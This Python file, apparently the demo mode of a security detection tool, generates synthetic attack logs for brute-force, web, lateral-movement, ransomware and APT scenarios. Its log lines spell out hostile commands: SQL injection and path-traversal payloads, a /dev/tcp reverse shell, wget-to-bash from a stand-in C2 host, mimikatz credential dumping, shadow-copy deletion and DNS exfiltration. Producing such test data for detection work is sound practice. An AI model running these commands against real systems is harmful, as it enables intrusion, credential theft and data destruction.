"""
Demo Log Generator
Generates realistic attack scenario logs for demo mode
"""
import random
from datetime import datetime, timedelta

ATTACKER_IPS = ["185.220.101.45", "45.33.32.156", "198.199.67.100", "104.21.44.200", "91.195.240.117"]
INTERNAL_IPS = ["192.168.1.10", "192.168.1.50", "10.0.0.25", "172.16.5.100"]
USERNAMES    = ["admin", "root", "ubuntu", "oracle", "postgres", "jenkins", "git"]

def _ts(offset_minutes: int = 0) -> str:
    dt = datetime.utcnow() - timedelta(minutes=offset_minutes)
    return dt.strftime("%b %d %H:%M:%S")


def generate_attack_logs(scenario: str) -> tuple:
    generators = {
        "brute_force": _brute_force_logs,
        "web_attack": _web_attack_logs,
        "lateral_movement": _lateral_movement_logs,
        "ransomware": _ransomware_logs,
        "apt": _apt_logs,
    }
    gen = generators.get(scenario, _brute_force_logs)
    return gen()


def _brute_force_logs() -> tuple:
    ip = random.choice(ATTACKER_IPS)
    lines = []
    # 200 failed attempts
    for i in range(200):
        user = random.choice(USERNAMES)
        ts = _ts(200 - i)
        lines.append(f"{ts} webserver sshd[{22000+i}]: Failed password for {user} from {ip} port {50000+i} ssh2")
    # Occasional invalid users
    for i in range(30):
        ts = _ts(190 - i * 5)
        lines.append(f"{ts} webserver sshd[{23000+i}]: Invalid user administrator from {ip} port {51000+i}")
    # Eventual success
    lines.append(f"{_ts(5)} webserver sshd[24999]: Accepted password for root from {ip} port 52100 ssh2")
    lines.append(f"{_ts(4)} webserver sshd[25000]: pam_unix(sshd:session): session opened for user root by (uid=0)")
    lines.append(f"{_ts(3)} webserver sudo[25001]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash")
    return "\n".join(lines), "syslog"


def _web_attack_logs() -> tuple:
    ip = random.choice(ATTACKER_IPS)
    lines = []
    ts_base = datetime.utcnow()
    def apache_ts(mins_ago): return (ts_base - timedelta(minutes=mins_ago)).strftime("%d/%b/%Y:%H:%M:%S +0000")

    # Reconnaissance
    for i in range(20):
        lines.append(f'{ip} - - [{apache_ts(60-i)}] "GET /robots.txt HTTP/1.1" 200 45 "-" "sqlmap/1.7.8"')
        lines.append(f'{ip} - - [{apache_ts(59-i)}] "GET /admin HTTP/1.1" 403 287 "-" "sqlmap/1.7.8"')

    # SQL injection
    sqli_payloads = [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users;--",
        "' OR 1=1 LIMIT 1--",
    ]
    for i, payload in enumerate(sqli_payloads):
        lines.append(f'{ip} - - [{apache_ts(40-i)}] "GET /login?user={payload}&pass=x HTTP/1.1" 500 892 "-" "sqlmap/1.7.8"')

    # Path traversal
    traversals = ["../../../../etc/passwd", "../../../../etc/shadow", "../../../proc/self/environ"]
    for i, path in enumerate(traversals):
        lines.append(f'{ip} - - [{apache_ts(30-i)}] "GET /{path} HTTP/1.1" 200 2048 "-" "nikto/2.1.6"')

    # Web shell upload + execution
    lines.append(f'{ip} - - [{apache_ts(20)}] "POST /upload.php HTTP/1.1" 200 45 "-" "python-requests/2.28"')
    lines.append(f'{ip} - - [{apache_ts(15)}] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 128 "-" "curl/7.68.0"')
    lines.append(f'{ip} - - [{apache_ts(10)}] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2048 "-" "curl/7.68.0"')
    lines.append(f'{ip} - - [{apache_ts(5)}] "GET /uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/{ip}/4444+0>%261 HTTP/1.1" 200 0 "-" "curl/7.68.0"')

    return "\n".join(lines), "apache"


def _lateral_movement_logs() -> tuple:
    attacker = random.choice(ATTACKER_IPS)
    pivot    = INTERNAL_IPS[0]
    target   = INTERNAL_IPS[1]
    lines = []

    # Initial compromise
    lines.append(f"{_ts(120)} dc01 sshd[1000]: Accepted publickey for admin from {attacker} port 44000 ssh2")
    lines.append(f"{_ts(115)} dc01 sudo[1001]:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash")

    # Recon
    lines.append(f"{_ts(110)} dc01 bash[1010]: nmap -sV -p 22,80,443,445,3389 {target}/24")
    lines.append(f"{_ts(108)} dc01 bash[1011]: cat /etc/passwd")
    lines.append(f"{_ts(106)} dc01 bash[1012]: cat /etc/shadow")

    # Credential dumping
    lines.append(f"{_ts(100)} dc01 bash[1020]: mimikatz privilege::debug sekurlsa::logonpasswords")
    lines.append(f"{_ts(98)} dc01 bash[1021]: python3 secretsdump.py administrator:Password1@{pivot}")

    # Lateral movement
    lines.append(f"{_ts(90)} {target} sshd[2000]: Accepted publickey for root from {pivot} port 55000 ssh2")
    lines.append(f"{_ts(88)} {target} sshd[2001]: pam_unix(sshd:session): session opened for user root by (uid=0)")

    # Persistence
    lines.append(f"{_ts(80)} {target} bash[2010]: crontab -e")
    lines.append(f"{_ts(79)} {target} cron[2011]: (root) CMD (wget -q http://c2.evil.com/payload.sh | bash)")
    lines.append(f"{_ts(75)} {target} bash[2012]: echo 'ssh-rsa AAAA...attacker_key' >> /root/.ssh/authorized_keys")

    # C2
    lines.append(f"{_ts(60)} {target} bash[2020]: curl http://185.220.101.1/beacon?id=target01&interval=30")

    return "\n".join(lines), "syslog"


def _ransomware_logs() -> tuple:
    ip = random.choice(ATTACKER_IPS)
    host = "fileserver01"
    lines = []

    # Phishing → initial access
    lines.append(f"{_ts(300)} {host} postfix[500]: from=<attacker@evil.com> to=<user@company.com> message-id=<malicious>")
    lines.append(f"{_ts(290)} {host} bash[1000]: powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=")

    # Defense evasion
    lines.append(f"{_ts(280)} {host} bash[1001]: net stop WindowsDefender")
    lines.append(f"{_ts(279)} {host} bash[1002]: sc config WinDefend start= disabled")
    lines.append(f"{_ts(278)} {host} bash[1003]: vssadmin delete shadows /all /quiet")

    # Discovery
    lines.append(f"{_ts(270)} {host} bash[1010]: net view /domain")
    lines.append(f"{_ts(268)} {host} bash[1011]: nltest /domain_trusts")

    # Lateral movement
    lines.append(f"{_ts(250)} {host} bash[1020]: psexec \\\\fileserver02 -u admin -p Password1 cmd")

    # Encryption
    lines.append(f"{_ts(200)} {host} bash[1030]: ransom_encryptor.exe --target C:\\Users --ext .locked --key RSA4096")
    lines.append(f"{_ts(180)} {host} kernel: [ALERT] Mass file modification detected: 10000+ files renamed to *.locked")
    lines.append(f"{_ts(170)} {host} bash[1031]: cmd.exe /c echo YOUR FILES ARE ENCRYPTED > C:\\Users\\Public\\README_DECRYPT.txt")
    lines.append(f"{_ts(160)} {host} bash[1032]: curl -X POST https://ransom-c2.onion/report?victim=company_com&files=52000")

    return "\n".join(lines), "syslog"


def _apt_logs() -> tuple:
    ip = random.choice(ATTACKER_IPS)
    lines = []

    # Spearphishing
    lines.append(f"{_ts(720)} mailserver postfix[100]: from=<ceo@legitimate-bank.com> to=<cfo@company.com> subject='Urgent Wire Transfer'")

    # Initial recon (slow & low)
    for i in range(5):
        lines.append(f"{_ts(700 - i*30)} webserver access: {ip} - GET /employee-directory.html HTTP/1.1 200")

    # Watering hole / drive-by
    lines.append(f"{_ts(600)} workstation01 chrome[2000]: Navigated to http://legitimate-bank-update.com/exploit.html")
    lines.append(f"{_ts(598)} workstation01 chrome[2001]: Downloaded file: update.exe from 185.220.101.45")

    # Foothold
    lines.append(f"{_ts(590)} workstation01 sysmon[3000]: Process Create: update.exe → cmd.exe → powershell -enc JABzAD0A")

    # Living off the land
    lines.append(f"{_ts(580)} workstation01 sysmon[3010]: Process: certutil.exe -urlcache -f http://c2.evil.com/stage2.dll")
    lines.append(f"{_ts(575)} workstation01 sysmon[3011]: Process: regsvr32.exe /s /n /u /i:http://c2.evil.com/stage2.dll scrobj.dll")

    # Persistence
    lines.append(f"{_ts(560)} workstation01 syslog: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d C:\\temp\\persist.exe")

    # Lateral movement (weeks later simulation)
    lines.append(f"{_ts(100)} dc01 EventID:4624 Account Name: svc_backup Source Network Address: {ip}")
    lines.append(f"{_ts(90)} dc01 EventID:4688 Process: mimikatz.exe")
    lines.append(f"{_ts(80)} fileserver sshd[9000]: Accepted publickey for domain\\admin from 192.168.1.10 port 44000")

    # Exfiltration (DNS tunneling)
    for i in range(20):
        encoded = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=40))
        lines.append(f"{_ts(60 - i)} dns01 named[4000]: query: {encoded}.exfil.evil.com IN TXT")

    return "\n".join(lines), "syslog"
